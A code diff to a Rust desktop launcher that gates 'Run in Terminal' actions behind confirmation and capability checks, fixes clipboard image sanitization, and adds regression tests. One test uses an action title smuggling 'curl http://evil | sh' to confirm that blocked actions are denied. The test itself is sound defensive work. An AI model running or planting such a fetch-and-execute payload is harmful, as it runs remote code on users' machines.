@@ -8,16 +8,16 @@ pub use crate::services::clipboard_store::*;
 use crate::services::storage;
 use crate::services::text_input::{is_wtype_available, type_text_via_wtype};
 use crate::{
-    Action, ActionFormCommand, ActionKind, ActionTarget, AppEntry, AppsProvider, AudioProvider,
-    BrowserTabsProvider, ClipboardProvider, CommandEntry, CommandsProvider, EmojiProvider,
-    ExecutionDecision, ExecutionPolicy, ExecutionRequest, ExecutionTicket, ExtensionManifest,
-    ExtensionsProvider, FileEntry, FilesProvider, HyprlandProvider, LauncherCommand, MAX_RESULTS,
-    MediaProvider, NamedValue, NamedValuesProvider, NetworkProvider, NiriProvider,
-    NotificationsProvider, PlaceholderContext, ProcessCommand, ProcessesProvider, ScriptEntry,
-    ScriptsProvider, SearchContext, SearchProvider, SecondaryAction, SecondaryActionKind,
-    ShellCommand, SwayProvider, SystemProvider, WebProvider, WindowsProvider, app_action,
-    append_alias, execute, expand_placeholders, expand_placeholders_shell, fuzzy_score, home_dir,
-    load_aliases, load_apps, load_clipboard_history, load_command_entries,
+    Action, ActionFormCommand, ActionKind, ActionRisk, ActionTarget, AppEntry, AppsProvider,
+    AudioProvider, BrowserTabsProvider, ClipboardProvider, CommandEntry, CommandsProvider,
+    EmojiProvider, ExecutionDecision, ExecutionPolicy, ExecutionRequest, ExecutionTicket,
+    ExtensionManifest, ExtensionsProvider, FileEntry, FilesProvider, HyprlandProvider,
+    LauncherCommand, MAX_RESULTS, MediaProvider, NamedValue, NamedValuesProvider, NetworkProvider,
+    NiriProvider, NotificationsProvider, PlaceholderContext, ProcessCommand, ProcessesProvider,
+    ScriptEntry, ScriptsProvider, SearchContext, SearchProvider, SecondaryAction,
+    SecondaryActionKind, ShellCommand, SwayProvider, SystemProvider, WebProvider, WindowsProvider,
+    app_action, append_alias, execute, expand_placeholders, expand_placeholders_shell, fuzzy_score,
+    home_dir, load_aliases, load_apps, load_clipboard_history, load_command_entries,
     load_extension_command_entries, load_extension_manifests, load_extension_script_entries,
     load_file_index, load_frequencies, load_lines, load_named_values, load_preferences,
     load_script_entries, normalize_alias, search_audio_actions, search_media_actions,
@@ -577,13 +577,29 @@ impl Zeshicast {
                 Ok(ExecutionDecision::RunNow)
             }
             SecondaryActionKind::RunInTerminal => {
+                // The terminal runs the action's text through a login shell, so
+                // it is gated exactly like a command: capabilities from the
+                // action, Shell risk, and the decision returned upward instead
+                // of spawning directly (P1.1).
                 let pref = self
                     .get_preferences()
                     .get("default_terminal")
-                    .map(|s| s.as_str());
-                let cmd = action.value();
-                let _ = crate::services::terminal::launch_in_terminal(&cmd, pref, true);
-                Ok(ExecutionDecision::RunNow)
+                    .map(String::as_str);
+                let command = crate::services::terminal::terminal_process_command(
+                    &action.value(),
+                    pref,
+                    true,
+                );
+                let ticket = ExecutionTicket {
+                    policy: if confirmed {
+                        ExecutionPolicy::confirmed()
+                    } else {
+                        ExecutionPolicy::interactive()
+                    },
+                    capabilities: action.capabilities.clone(),
+                    risk: ActionRisk::Shell,
+                };
+                Ok(execute(ExecutionRequest::Command(command), &ticket))
             }
         }
     }
@@ -592,10 +608,19 @@ impl Zeshicast {
         if !self.clipboard_history_enabled() || self.clipboard_private_mode() {
             return Ok(false);
         }
+        // Incoming text is sanitized here: pasted text must never be able to
+        // claim to be an image entry (M-15).
         let text = crate::normalize_clipboard_text(text);
         if text.is_empty() {
             return Ok(false);
         }
+        self.store_clipboard_entry(text)
+    }
+
+    /// Retention/insertion tail shared by text and image entries. The caller is
+    /// responsible for sanitizing untrusted input; the image sentinel is added
+    /// by [`Self::add_clipboard_image`] after sanitization, not parsed from it.
+    fn store_clipboard_entry(&mut self, text: String) -> io::Result<bool> {
         let retention = self.clipboard_retention();
         storage::clipboard_insert_with_limit(&self.config_dir, &text, retention)
             .map_err(|e| io::Error::other(e.to_string()))?;
@@ -656,7 +681,10 @@ impl Zeshicast {
         if !self.clipboard_capture_images() {
             return Ok(false);
         }
-        self.add_clipboard_text(&format!("{CLIPBOARD_IMAGE_PREFIX}{path}"))
+        // The entry is built here rather than sanitized from input, so the
+        // sentinel survives and the cached PNG is recognised (and kept by the
+        // pruner) instead of degrading into a text entry.
+        self.store_clipboard_entry(format!("{CLIPBOARD_IMAGE_PREFIX}{path}"))
     }
 
     pub fn list_snippets(&self) -> Vec<SnippetSummary> {
@@ -1329,7 +1357,7 @@ impl ExtensionSummary {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::ActionRisk;
+    use crate::ActionForm;
     use std::fs;
     use std::time::{SystemTime, UNIX_EPOCH};
 
@@ -1395,6 +1423,146 @@ mod tests {
             .expect("snippet matching its own name should be found");
 
         assert_eq!(expanded, "token=secret-token");
+    }
+
+    #[test]
+    fn clipboard_image_entry_round_trips_and_survives_pruning() {
+        // Regression (P1.7 follow-up): `add_clipboard_image` must not run the
+        // internal sentinel through the paste-ingest sanitizer, otherwise the
+        // entry degrades to text and the cached PNG is pruned away again.
+        let cache = test_cache_dir("clipboard-image-roundtrip");
+        fs::create_dir_all(&cache).unwrap();
+        let image = cache.join("shot.png");
+        fs::write(&image, b"png").unwrap();
+
+        let mut app = test_app(
+            test_cache_dir("clipboard-image-roundtrip-config"),
+            HashMap::new(),
+        );
+        let stored = with_clipboard_cache_dir(&cache, || {
+            app.add_clipboard_image(&image.to_string_lossy()).unwrap()
+        });
+        assert!(stored);
+
+        let entry = app
+            .clipboard_history
+            .first()
+            .cloned()
+            .expect("entry stored");
+        assert_eq!(
+            with_clipboard_cache_dir(&cache, || crate::clipboard_image_path(&entry)),
+            Some(image.to_string_lossy().as_ref())
+        );
+        assert_eq!(
+            with_clipboard_cache_dir(&cache, || classify_clipboard_text(&entry)),
+            ClipboardKind::Image
+        );
+
+        // The pruner must keep the file the entry still references.
+        with_clipboard_cache_dir(&cache, || {
+            prune_clipboard_image_cache(&app.clipboard_history).unwrap();
+        });
+        assert!(image.exists());
+
+        let _ = fs::remove_dir_all(cache);
+    }
+
+    #[test]
+    fn form_submission_requires_confirmation() {
+        let mut app = test_app(test_cache_dir("form-confirm"), HashMap::new());
+        let action = Action::new(
+            "Command",
+            "Deploy",
+            ActionKind::Form(ActionForm {
+                name: "Deploy".to_string(),
+                fields: Vec::new(),
+                command: ActionFormCommand::Shell("true".to_string()),
+                env: HashMap::new(),
+                preferences: HashMap::new(),
+                current_args: HashMap::new(),
+                partial_query: String::new(),
+                capabilities: crate::CapabilitySet::new(vec![crate::Capability::Shell]),
+                risk: ActionRisk::Shell,
+            }),
+            0,
+        )
+        .with_risk(ActionRisk::Shell);
+
+        // Interactive policy: the form must ask before running.
+        assert_eq!(
+            app.run_form_action(&action, HashMap::new()),
+            ExecutionDecision::NeedsConfirmation(ActionRisk::Shell)
+        );
+        assert_eq!(crate::take_exec_count(), 0);
+
+        // Confirmed policy runs it exactly once, through the gateway.
+        assert_eq!(
+            app.run_form_action_confirmed(&action, HashMap::new()),
+            ExecutionDecision::RunNow
+        );
+        assert_eq!(crate::take_exec_count(), 1);
+    }
+
+    #[test]
+    fn form_without_capabilities_is_denied_even_when_confirmed() {
+        let mut app = test_app(test_cache_dir("form-denied"), HashMap::new());
+        let action = Action::new(
+            "Command",
+            "Deploy",
+            ActionKind::Form(ActionForm {
+                name: "Deploy".to_string(),
+                fields: Vec::new(),
+                command: ActionFormCommand::Shell("true".to_string()),
+                env: HashMap::new(),
+                preferences: HashMap::new(),
+                current_args: HashMap::new(),
+                partial_query: String::new(),
+                capabilities: crate::CapabilitySet::empty(),
+                risk: ActionRisk::Shell,
+            }),
+            0,
+        );
+
+        let decision = app.run_form_action_confirmed(&action, HashMap::new());
+        assert!(
+            matches!(decision, ExecutionDecision::Denied(_)),
+            "expected denial, got {decision:?}"
+        );
+        assert_eq!(crate::take_exec_count(), 0);
+    }
+
+    #[test]
+    fn run_in_terminal_is_refused_for_blocked_actions() {
+        // F-2: `Run in Terminal` runs the action's text through a shell, so a
+        // blocked action (whose `value()` falls back to manifest-controlled
+        // title text) must not be executable through it.
+        let mut app = test_app(test_cache_dir("terminal-blocked"), HashMap::new());
+        let blocked = Action::new(
+            "Command",
+            "Backup helper; sh -c 'curl http://evil | sh'; #",
+            ActionKind::None,
+            0,
+        )
+        .with_capabilities(crate::CapabilitySet::empty());
+
+        assert_eq!(
+            crate::secondary_action_risk(&blocked, SecondaryActionKind::RunInTerminal),
+            ActionRisk::Shell,
+            "terminal launches always ask for confirmation"
+        );
+        assert_eq!(
+            app.run_secondary_action(&blocked, SecondaryActionKind::RunInTerminal)
+                .unwrap(),
+            ExecutionDecision::NeedsConfirmation(ActionRisk::Shell)
+        );
+        let decision = app
+            .run_secondary_action_confirmed(&blocked, SecondaryActionKind::RunInTerminal)
+            .unwrap();
+        assert!(
+            matches!(decision, ExecutionDecision::Denied(_)),
+            "expected denial, got {decision:?}"
+        );
+        assert_eq!(crate::take_exec_count(), 0);
     }
 
     #[test]
